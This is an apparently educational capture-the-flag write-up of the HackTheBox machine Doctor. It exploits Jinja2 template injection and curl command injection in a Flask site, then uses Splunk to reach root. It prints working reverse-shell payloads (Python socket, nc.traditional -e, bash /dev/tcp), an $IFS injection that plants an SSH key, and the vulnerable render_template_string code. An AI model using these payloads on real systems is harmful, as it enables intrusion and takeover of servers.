---
title: HTB: Doctor
url: https://0xdf.gitlab.io/2021/02/06/htb-doctor.html
date: 2021-02-06T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, ctf, htb-doctor, nmap, splunk, vhosts, flask, payloadsallthethings, ssti, command-injection, injection, adm, linpeas, splunk-whisperer2, htb-secnotes, oscp-like-v2
---

![Doctor](https://0xdfimages.gitlab.io/img/doctor-cover.png)

Doctor was about attacking a message board-like website. I’ll find two vulnerabilities in the site, Server-Side Template injection and command injection. Either way, the shell I get back has access to read logs, where I’ll find a password sent to a password reset url, which works for both the next user and to log into the Splunk Atom Feed. I’ll exploit that with SplunkWhisperer2 to get RCE and a root shell. In Beyond Root, I’ll look at a strange artifact I found on the box where, and examine the source for both web exploit.

## Box Info

| Name | [Doctor](https://hackthebox.com/machines/doctor)  [Doctor](https://hackthebox.com/machines/doctor) [Play on HackTheBox](https://hackthebox.com/machines/doctor) |
| --- | --- |
| Release Date | [26 Sep 2020](https://twitter.com/hackthebox_eu/status/1309129779501772801) |
| Retire Date | 06 Feb 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Doctor |
| Radar Graph | Radar chart for Doctor |
| First Blood User | 00:36:05[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:36:12[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [egotisticalSW egotisticalSW](https://app.hackthebox.com/users/94858) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS/Splunk (8089):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.209
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 15:09 EDT
Nmap scan report for 10.10.10.209
Host is up (0.014s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 15:14 EDT
Nmap scan report for 10.10.10.209
Host is up (0.014s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Focal 20.04.

### Splunkd - TCP 8089

[This page](https://www.learnsplunk.com/splunk-troubleshooting.html) provides good detail as to the different TCP ports used by Splunk. 8089 is the management port, including exposing the REST API.

Visiting this returns a page with four options:

![image-20201031152834778](https://0xdfimages.gitlab.io/img/image-20201031152834778.png)

The first and fourth links just say “Invalid Request”. The second and third links pop HTTP basic auth boxes. I took a couple guesses at creds, but no luck.

I did a `searchsploit` vulns in Splunkd, but didn’t find anything useful. Googling for “Splunk 8089 exploit” did find some interesting stuff. [SplinkWhisperer2](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/) looks like it could work here, but I’ll need creds. I’ll come back once I have them.

### Website - TCP 80

The site is for a health care provider:

[![image-20201031152607275](https://0xdfimages.gitlab.io/img/image-20201031152607275.png)](https://0xdfimages.gitlab.io/img/image-20201031152607275.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20201031152607275.png)

The HTTP headers show this is running on Apache:

```

HTTP/1.1 200 OK
Date: Sun, 01 Nov 2020 10:23:44 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sat, 19 Sep 2020 16:59:55 GMT
ETag: "4d88-5afad8bea6589-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 19848
Connection: close
Content-Type: text/html

```

There’s an email address, `info@doctors.htb`. I didn’t find much else to do with it, but I did add `doctors.htb` to my hosts file.

### doctors.htb - TCP 80

Visiting `http://doctors.htb` returns a redirect to a login form at `http://doctors.htb/login?next=%2F`:

![image-20201031153416538](https://0xdfimages.gitlab.io/img/image-20201031153416538.png)

I noticed in the HTTP headers that this page is not served under the same Apache server as above, but rather using Python:

```

HTTP/1.1 200 OK
Date: Sun, 01 Nov 2020 10:21:07 GMT
Server: Werkzeug/1.0.1 Python/3.8.2
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Connection: close
Content-Length: 248

```

I don’t have any creds, and no basic SQLi seemed to work, but there is a Sign Up Now link. When I complete that form, it redirects back to the login page, with a note:

![image-20201031153543167](https://0xdfimages.gitlab.io/img/image-20201031153543167.png)

Once I log in, it presents a relatively empty page:

![image-20201101045903292](https://0xdfimages.gitlab.io/img/image-20201101045903292.png)

That 1 in a blue box looks like the page number (clicking it goes to `/home?page=1`).

The “New Message” link provides a form where I can create a post with title and content, and it now shows on the page:

![image-20201101050043569](https://0xdfimages.gitlab.io/img/image-20201101050043569.png)

In the page source, there’s a commented option in the nav bar referring to `/archive`:

```

      <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
        <div class="container">
          <a class="navbar-brand mr-4" href="/">Doctor Secure Messaging</a>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarToggle">
            <div class="navbar-nav mr-auto">
              <a class="nav-item nav-link" href="/home">Home</a>
              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
            </div>
            <!-- Navbar Right Side -->
            <div class="navbar-nav">
              
                <a class="nav-item nav-link" href="/post/new">New Message</a>
                <a class="nav-item nav-link" href="/account">Account</a>
                <a class="nav-item nav-link" href="/logout">Logout</a>
              
            </div>
          </div>
        </div>
      </nav>

```

Visiting returns XML about the posts that exist:

```

HTTP/1.1 200 OK
Date: Sun, 01 Nov 2020 10:05:37 GMT
Server: Werkzeug/1.0.1 Python/3.8.2
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Content-Length: 157
Connection: close

	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>Test Post</title></item>
	</channel>

```

I tried to send payloads that might identify some kind of XXE vulnerability, but didn’t find anything useful.

## Shell as web

### Via SSTI

#### Background

Python web servers can be vulnerable to Server Side Template Injections. If the user input isn’t sanitized, it can be included in template code rather than handled as text, and this can allow for remote code execution. OWASP has a [page](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection#:~:text=Server%20Side%20Template%20Injection%20vulnerabilities,code%20execution%20on%20the%20server.) that goes into good detail on the background. A quick example would be a Python Jinja2-based server that has a route like this:

```

@app.route("/hello")
def hello():
    user = request.values.get("user")
    return Jinja2.from_string(f'Hello {user}!').render()

```

If the user submits a get request like `/hello?user={{7*7}}`, the result would be `Hello 49!`, because the `render` function would process the text inside curly brackets.

#### Testing for SSTI

PayloadsAllTheThings has a great image on the [SSTI page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology) that shows how to test for SSTI:

![img](https://0xdfimages.gitlab.io/img/doctor-serverside.png)

So I submitted the first test with injection attempts in both the title and the message:

![image-20201101054424798](https://0xdfimages.gitlab.io/img/image-20201101054424798.png)

I don’t see any injections when the post is displayed back:

![image-20201101054457363](https://0xdfimages.gitlab.io/img/image-20201101054457363.png)

The next test failed too:

![image-20201101054536447](https://0xdfimages.gitlab.io/img/image-20201101054536447.png)

After a bit of confusion, I started looking around again, and eventually came back to `/archive`, which now has an interesting result:

```

	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>${7*7}</title></item>

			</channel>
			<item><title>49</title></item>

			</channel>

```

There is SSTI after all! I created a new message with the title `{{7*'7'}}`, and the result points to Jinja2 or Twig:

```

	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>${7*7}</title></item>

			</channel>
			<item><title>49</title></item>
	
			</channel>
			<item><title>7777777</title></item>
	
			</channel>

```

#### Shell

I’ll grab the [RCE payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset) from PayloadsAllTheThings and modify it by putting in my IP / port, and changing the process to `bash -i` to get a shell:

```

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.6\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

```

When I put this in as the title and then refresh `/archive`, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:40136.
bash: cannot set terminal process group (912): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)

```

### Via Command Injection

#### Enumeration

Whenever I have a form that displays back to my on the page, it’s good to check for user interaction (like in [SecNotes](/2019/01/19/htb-secnotes.html#get-tylers-credentials)) and/or cross site scripting (XSS). I created two links, and put a script box in the body:

![image-20201101100239532](https://0xdfimages.gitlab.io/img/image-20201101100239532.png)

I started a Python webserver, and on hitting submit, the post was created:

![image-20201101100337162](https://0xdfimages.gitlab.io/img/image-20201101100337162.png)

The input is handled as text and not as HTML. What’s weird is that I still got one hit on my webserver:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.209 - - [01/Nov/2020 10:02:59] code 404, message File not found
10.10.10.209 - - [01/Nov/2020 10:02:59] "GET /content HTTP/1.1" 404 -

```

The hit was instant on clicking submit. It isn’t clear to me if this is simulated user interaction, or some kind of validation script on the host, but it’s worth poking at.

#### Identify Client

I killed the Python webserver and started `nc` to get a better feel for the entire request. I resubmitted a post with the body of `http://10.10.14.6/test`, and again the request came instantly:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:34852.
GET /test HTTP/1.1
Host: 10.10.14.6
User-Agent: curl/7.68.0
Accept: */*

```

The request hung for a second, and then returned, just as it returned, the webpage popped an error message:

![image-20201101100729739](https://0xdfimages.gitlab.io/img/image-20201101100729739.png)

This is looking more like some kind of link validation checker on the server, and it is running curl to do it (not something native inside python like `requests`).

#### Command Injection POC

Now with both `nc` listening on 80 and `tcpdump` listening for ICMP, I crafted my next payload, `http://10.10.14.6/$(whoami)`, and it returned the username, web:

```
10.10.10.209 - - [01/Nov/2020 10:12:53] "GET /web HTTP/1.1" 404 -

```

If I change the command to `id`, I get up the first space, “uid=1001(web)”:

```
10.10.10.209 - - [01/Nov/2020 10:13:33] "GET /uid=1001(web) HTTP/1.1" 404 -

```

Trying to do more complex commands failed as it became clear that adding a space was breaking things. I tried using `$IFS` to represent space (a common injection technique), and eventually found that that plus a combination of `'` around the arguments could get it to work with something like:

```

http://10.10.14.6/$(ping$IFS-c$IFS'1'$IFS'10.10.14.6')

```

And I’d get a ping:

```

root@kali# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
10:16:12.333148 IP 10.10.10.209 > 10.10.14.6: ICMP echo request, id 3, seq 1, length 64
10:16:12.333176 IP 10.10.14.6 > 10.10.10.209: ICMP echo reply, id 3, seq 1, length 64

```

#### Shell via SSH

It took a bit of playing around with single quotes again, but I got the injection to write an SSH key to the current user, web (which I know from `whoami` injection). I’m using a ed25519 key (because they are really short). It turns out there is no `.ssh` directory in `/home/web`, so I’ll need to create one with:

```

http://10.10.14.6/$(mkdir$IFS'/home/web/.ssh')

```

Then I’ll write my key:

```

http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d'>'/home/web/.ssh/authorized_keys')

```

Now I’ll connect with that key and have an SSH shell:

```

root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# ssh -i ~/keys/ed25519_gen web@10.10.10.209
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

76 updates can be installed immediately.
36 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Sun Nov  1 16:25:12 2020 from 10.10.14.6
web@doctor:~$

```

#### Shell via nc.traditional

If I start with just connecting with `nc` (not a shell), it works with a payload of `http://10.10.14.6/$(nc$IFS'10.10.14.6'$IFS'443')`:

```

root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:40418.

```

Various reverse shells didn’t work. I tried `-e /bin/bash` on `nc`, as well as Bash reverse shells without success. Eventually I tried `nc.traditional` (which is like `nc`, but will have the `-e` flag), and it worked:

```

http://10.10.14.6/$(nc.traditional$IFS-e$IFS'/bin/bash'$IFS'10.10.14.6'$IFS'443')

```

I got a shell:

```

root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:40450.
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)

```

## Shell as shaun

### Enumeration

#### Manual

As web, I can see one other user on the box, shaun:

```

web@doctor:/home$ ls
shaun  web

```

`user.txt` is in shaun’s home directory, but I can’t read it yet.

web is also a member of the adm group:

```

web@doctor:/home/shaun$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)

```

This is interesting because it means that web can read log files. I did a quick `grep` through all the logs for the string `passw` (which should get both “passwd” and “password”):

```

web@doctor:/var/log$ grep -r passw . 2>/dev/null   
./auth.log:Nov  1 11:42:05 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
./auth.log:Nov  1 11:42:11 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
./auth.log:Nov  1 11:42:20 doctor VGAuth[669]: message repeated 20 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
./auth.log:Nov  1 11:42:37 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
./auth.log:Nov  1 11:42:50 doctor VGAuth[669]: message repeated 15 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
./auth.log:Nov  1 11:42:51 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
./auth.log:Nov  1 11:42:52 doctor VGAuth[669]: message repeated 7 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
./auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
./auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
./auth.log.1:Nov  1 11:42:04 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
./auth.log.1:Nov  1 11:42:04 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
./apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001@8612c285930942bc8295a5e5404c6fb7-000000000000d0e1-0005ae7b997ca2d8.journal matches
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-000000000000cf5a-0005ae7b98c1acfe.journal matches
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000003ac7-0005ab70dc697773.journal matches
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/user-1002@84e1503b20fd49eca2b6ca0b7d6fdeeb-00000000000176d6-0005af5694057aa6.journal matches
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system@68325fc054024f8aac6fcf2ce991a876-0000000000033c8f-0005afad8045c159.journal matches

```

This line from the Apache logs is interesting:

```

./apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"

```

“Guitar123” doesn’t look like an email address. It looks like a password.

#### LinPEAS

If I hadn’t checked manually, [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) would have also found this for me. I’ll host it from a Python web server on my host:

```

root@kali:/opt/privilege-escalation-awesome-scripts-suite/linPEAS# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Now from my web shell, I can download it, make it executable, and run it:

```

web@doctor:/dev/shm$ wget 10.10.14.6/linpeas.sh                                                                                                                                                           
--2020-11-01 12:23:16--  http://10.10.14.6/linpeas.sh                                                                                                                                                     Connecting to 10.10.14.6:80... connected.                                                                                                                                                                 
HTTP request sent, awaiting response... 200 OK                                                       
Length: 159864 (156K) [text/x-sh]                                                                                                                                                                         
Saving to: ‘linpeas.sh’                                                                                                                                                                                   
                                                                                                                                                                                                          
linpeas.sh          100%[===================>] 156,12K  --.-KB/s    in 0,06s                                                                                                                              
                                                                                                                                                                                                          2020-11-01 12:23:16 (2,69 MB/s) - ‘linpeas.sh’ saved [159864/159864]                                                                                                                                      
                                                                                                     
web@doctor:/dev/shm$ chmod +x ./linpeas.sh                                                                                                                                                                web@doctor:/dev/shm$ ./linpeas.sh
...[snip]...

```

The password comes out in the section “Finding passwords inside logs”:

```

[+] Finding passwords inside logs (limit 70)
Binary file /var/log/apache2/access.log.12.gz matches
Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
Binary file /var/log/kern.log.2.gz matches
Binary file /var/log/kern.log.4.gz matches
Binary file /var/log/syslog.4.gz matches
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
/var/log/auth.log.1:Nov  1 11:42:04 doctor VGAuth[669]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2                      
/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2

```

### su

It turns out that Guitar123 is shaun’s password:

```

web@doctor:/var/log$ su - shaun
Password: 
shaun@doctor:~$

```

Now I have access to `user.txt`:

```

shaun@doctor:~$ cat user.txt
4300eefd************************

```

## Shell as root

### Enumeration

Remembering the Splunk privesc from above, I went back to the Splunk page and tried shaun’s creds in the HTTP basic auth, and it worked. There’s a lot more functions now:

[![image-20201101061303774](https://0xdfimages.gitlab.io/img/image-20201101061303774.png)](https://0xdfimages.gitlab.io/img/image-20201101061303774.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20201101061303774.png)

### POC

I ran `git clone https://github.com/cnotin/SplunkWhisperer2.git` to get a copy of the repo locally, and then decided to try the exploit with a simple `ping` to test it. I started `tcpdump`, and then ran the exploit:

```

root@kali:/opt/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload "ping -c 1 10.10.14.6"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpwvtxfq84.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.6:8181/
10.10.10.209 - - [01/Nov/2020 06:15:40] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

```

At `tcpdump`, I got pinged:

```

root@kali# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
06:15:40.494671 IP 10.10.10.209 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
06:15:40.494729 IP 10.10.14.6 > 10.10.10.209: ICMP echo reply, id 1, seq 1, length 64

```

I hit enter in the exploit window and it cleaned up.

### Shell

Now I’ll start `nc` and change the payload from `ping` to a reverse shell:

```

root@kali:/opt/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpceoe88rl.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.6:8181/
10.10.10.209 - - [01/Nov/2020 06:17:57] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed
[+] Stopped HTTP server
Bye!

```

At `nc` a root shell connected:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.209.
Ncat: Connection from 10.10.10.209:40142.
bash: cannot set terminal process group (1140): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# 

```

And I can grab `root.txt`:

```

root@doctor:/root# cat root.txt
fba452cc************************

```

## Beyond Root

### Leftover Artifact

I had an interesting experience while working on Doctor, and managed (with a bit of help from Jkr) to work out what was going on.

#### Situation

If I create an account on the webpage after the first time the database is reset, and then reset the box, once the box comes up, if I refresh the homepage, I get this:

![image-20201108113043144](https://0xdfimages.gitlab.io/img/image-20201108113043144.png)

I’m seeing a post from shaun that is clearly an attempt to exploit the vulnerability on the box. But why am I logged in as shaun? What is this post on a clean box? To show what’s going on, I’ll need to show:
- How the database is cleared every 20 minutes;
- How the flask cookie works;
- The state of the database in the VM’s submitted / on reset state.

#### Database Cleanup

When I registered an account, it warned me that the account would only last 20 minutes. With a root shell, I can see that there’s a cron running:

```

root@doctor:~# crontab -l
...[snip]...
# m h  dom mon dow   command
*/20 * * * * /opt/clean/cleandb.py

```

This Python script removes the `site.db` file, copies a clean version into place, and sets the permissions:

```

#!/usr/bin/env python3
import os

os.system('rm /home/web/blog/flaskblog/site.db')
os.system('cp /opt/clean/site.db /home/web/blog/flaskblog/site.db')
os.system('chown web:web /home/web/blog/flaskblog/site.db')

```

#### Flask Cookie

The site sets a cookie that looks like this:

```

Cookie: session=.eJwtjkFqQzEMRO_idRa2JEtyLvOxLJmWQAv_J6uQu1eLMpuZYRjeuxz7jOur3J_nK27l-PZyL1BblTqJ91joC5itQnXrG8h9g8Pw0aRWFlWLdJKLaQuJPabadMs0oqGzo3cOElsurqA2cMkU64bks6kLGSmHSOurpoJLgryuOP9pMq7r3Mfz9xE_WSRafusw2mir0UQ1wOYN8t37sBDaGrN8_gBAKECD.X6gfcQ.mfT1KVEf-UInckjFQhj7lNyoCNA

```

At first I thought it was a JWT, but it was not. [This site](https://www.kirsle.net/wizards/flask-session.cgi) will decode Flask cookies (note, you can decode, but you can’t modify without having the signing secret):

```

{
    "_fresh": true,
    "_id": "201070a46f9c3dc266b020db5f24ddf2d29d917006788be17076b0abc346dea8badbabc9e13d6d3d56e47bcd7d828b93c7a7b5b34da18d74b486e7715c0c0ce6",
    "_user_id": "2",
    "csrf_token": "70ac9e89b4f3bc14a38b231d1228bd59be74f8ea"
}

```

Looking at the source code, it seems that `user_id` is what is read out of this cookie, and then used to fetch the user from the database:

```

    @staticmethod
    def verify_reset_token(token):
        s = Serializer(current_app.config['SECRET_KEY'])
        try:
            user_id = s.loads(token)['user_id']
        except:
            return None
        return User.query.get(user_id)    

```

So if I can keep a valid cookie across box resets (or database clears), I can become another user. This seems unlikely to come up on a real world system, but will come up all time time on CTFs like HTB.

#### Database Frozen State

I exfiled a copy of `site.db` from the working site directory just after a reset. In this database, there are two users:

```

root@kali# sqlite3 site.db 
SQLite version 3.33.0 2020-08-14 13:23:32
Enter ".help" for usage hints.
sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
2|shaun|s@s.com|default.gif|$2b$12$wW0SocwtbEImnxgWoHJPMOzbTKs1qYCeE5Q0KnBtCXqD7NzuDne4y

```

There’s also the exploit post associated with userid 2:

```

sqlite> select * from post;
1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
2|{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}|2020-09-28 13:01:21.252038|dsdsdsa|2

```

I grabbed a copy of the “clean” database from `/opt/clean`, and it only showed one user:

```

sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S

```

And only one post:

```

sqlite> select * from post;
1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1

```

#### Putting It All Together

Once I wait until the cleanup job runs, the user with user ID 2 is now available. If I register this user, I’ll get a signed cookie with this user id 2. Now if I reset the box, on reset, there’s already a user with user ID 2 - shaun. When I reach that page with that cookie, I am already logged in as shaun.

### Template Injection

The template injection takes place in the `/archive` route, which is defined in `/home/web/blog/flaskblog/main/routes.py`:

```

from flask import render_template, render_template_string, request, Blueprint
from flask_login import current_user, login_required
from flaskblog.models import Post

main = Blueprint('main', __name__)

@main.route("/")
@main.route("/home")
@login_required
def home():
        page = request.args.get('page', 1, type=int)
        posts = Post.query.order_by(Post.date_posted.asc()).paginate(page=page, per_page=10)
        return render_template('home.html', posts=posts, author=current_user)

@main.route("/archive")
def feed():
        posts = Post.query.order_by(Post.date_posted.asc())
        tpl = '''
        <?xml version="1.0" encoding="UTF-8" ?>
        <rss version="2.0">
        <channel>
        <title>Archive</title>
        '''
        for post in posts:
                if post.author==current_user:
                        tpl += "<item><title>"+post.title+"</title></item>\n"
                        tpl += '''
                        </channel>
                        '''
        return render_template_string(tpl)

```

The code is just looping over all the posts, and adding XML each time there’s a post where the author matches the current user, building the output as a string. That string is then passed to `render_template_string`, which is a [dangerous function](https://blog.nvisium.com/injecting-flask) to pass user input.

On the other hand, I can look at how the same input is passed into the home page. The posts array is passed to `render_template` with `home.html`. That template loops over the posts and puts the content into the template:

```

{% extends "layout.html" %}
{% block content %}
    {% for post in posts.items %}
        {% if post.author == current_user %}
        <article class="media content-section">
          <img class="rounded-circle article-img" src="{{ url_for('static', filename='profile_pics/' + post.author.image_file) }}">
          <div class="media-body">
            <div class="article-metadata">
              <a class="mr-2" href="{{ url_for('users.user_posts', username=post.author.username) }}">{{ post.author.username }}</a>
              <small class="text-muted"></small>
            </div>
            <h2><a class="article-title" href="{{ url_for('posts.post', post_id=post.id) }}">{{ post.title }}</a></h2>
            <p class="article-content">{{ post.content }}</p>
          </div>
        </article>
        {% endif %}
    {% endfor %}
    {% for page_num in posts.iter_pages(left_edge=1, right_edge=1, left_current=1, right_current=2) %}
      {% if page_num %}
        {% if posts.page == page_num %}
          <a class="btn btn-info mb-4" href="{{ url_for('main.home', page=page_num) }}">{{ page_num }}</a>
        {% else %}
          <a class="btn btn-outline-info mb-4" href="{{ url_for('main.home', page=page_num) }}">{{ page_num }}</a>
        {% endif %}
      {% else %}
        ...
      {% endif %}
    {% endfor %}
{% endblock content %}

```

